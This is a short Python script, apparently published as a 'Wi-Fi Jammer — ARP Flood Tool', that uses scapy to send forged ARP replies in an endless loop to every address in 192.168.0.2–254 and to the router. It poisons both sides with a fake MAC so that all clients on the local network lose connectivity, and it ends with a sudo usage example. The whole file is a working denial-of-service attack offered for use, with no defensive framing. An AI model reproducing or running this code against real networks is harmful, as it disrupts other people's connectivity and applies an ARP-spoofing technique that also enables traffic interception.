import argparse
from scapy.layers.l2 import ARP
from scapy.sendrecv import sendp, conf
import time

def print_banner():
    banner = r"""
 __        ___  _   _ _____ _____ _   _  _____ 
 \ \      / / || | | |_   _| ____| \ | |/ ____|
  \ \ /\ / /| || |_| | | | |  _| |  \| | |  _  
   \ V  V / |__   _| | | | | |___| |\  | |_| | 
    \_/\_/     |_| |_| |_| |_____|_| \_|\____|  
      Wi-Fi Jammer  —  ARP Flood Tool 🚀
        github.com/Artemy-dev | by @Artemy_Develop
    """
    print(banner)

def turningOffWiFi(gate_ip, gate_mac, iface):
    conf.iface = iface
    conf.verb = 0
    print_banner()
    target_ips = [f"192.168.0.{i}" for i in range(2, 255)]
    print(f"[+] Начинаю рассылать ARP-пакеты через интерфейс {iface}...")
    try:
        while True:
            for ip in target_ips:
                arp_response = ARP(op=2, pdst=ip, hwdst="ff:ff:ff:ff:ff:ff",
                                   psrc=gate_ip, hwsrc="00:11:22:33:44:55")
                sendp(arp_response, verbose=0)
                arp_response = ARP(op=2, pdst=gate_ip, hwdst=gate_mac,
                                   psrc=ip, hwsrc="00:11:22:33:44:55")
                sendp(arp_response, verbose=0)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[!] Остановлено пользователем.")

def main():
    parser = argparse.ArgumentParser(description="Wi-Fi Jammer (ARP flood tool)")
    parser.add_argument("--iface", required=True, help="Сетевой интерфейс, например en0 или eth0")
    parser.add_argument("--gateway-ip", required=True, help="IP адрес роутера")
    parser.add_argument("--gateway-mac", required=True, help="MAC адрес роутера")
    args = parser.parse_args()

    turningOffWiFi(gate_ip=args.gateway_ip, gate_mac=args.gateway_mac, iface=args.iface)

if __name__ == "__main__":
    main()

"""
sudo python3 main.py --iface en0 --gateway-ip 192.168.0.1 --gateway-mac c8:3a:35:28:3e:78
"""